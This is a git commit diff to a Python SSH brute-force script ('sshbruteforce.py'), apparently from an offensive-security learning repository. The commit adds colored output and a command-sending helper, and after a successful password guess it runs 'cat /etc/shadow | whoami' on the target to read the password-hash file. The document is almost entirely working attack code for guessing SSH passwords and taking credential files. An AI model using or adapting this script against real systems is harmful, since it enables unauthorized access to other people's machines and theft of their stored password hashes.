46ff214cbc7b7cac44a253d9cda740b76efe35c2
Deepak <nagarkotideepak9843@gmail.com>
2022-07-28 14:39:08 -0400

    added tweaks and colored in print

--- 02-SSH-FTP/sshbruteforce.py
+++ 02-SSH-FTP/sshbruteforce.py
@@ -1,13 +1,12 @@
 #!/usr/bin/python
 import pexpect
+from termcolor import colored
 PROMPT = ['# ', '>>> ', '> ', '\$ ', '~# ']
 
-
-# def send_command(child, cmd):
-#     child.sendline(cmd)
-#     child.expect(PROMPT)
-#     print(child.before, child.after)
-
+def send_command(child,command):
+    child.sendline(command)
+    child.expect(PROMPT)
+    print(child.before)
 
 def connect(hostkeyal, user, host, password):
     ssh_newkey = 'Are you sure you want to continue connecting (yes/no)?'
@@ -21,7 +20,7 @@ def connect(hostkeyal, user, host, password):
         print('[-] Error Connecting')
         return  # THIS WILL RETURN A NONE SO YOU SHOULD CHECK FOR IT.  SHOULD EXPLICITLY DO A return None TO MAKE IT CLEARER
     child.sendline(password)
-    child.expect(PROMPT)
+    child.expect(PROMPT, timeout=0.5)
     return child
     
 def main():
@@ -35,9 +34,10 @@ def main():
         password = password.strip('\n')
         try:
             child=connect(hostkeyal, user, host, password)
-            print('[+] Password Found ' + password)
+            print(colored('[+] Password Found ' + password, 'green'))
+            send_command(child, 'cat /etc/shadow | whoami')
         except:
-            print('[-] WRONG Passowrd' + password)
+            print(colored('[-] WRONG Passowrd ' + password, 'red'))
 
 if __name__ == '__main__':
     main()
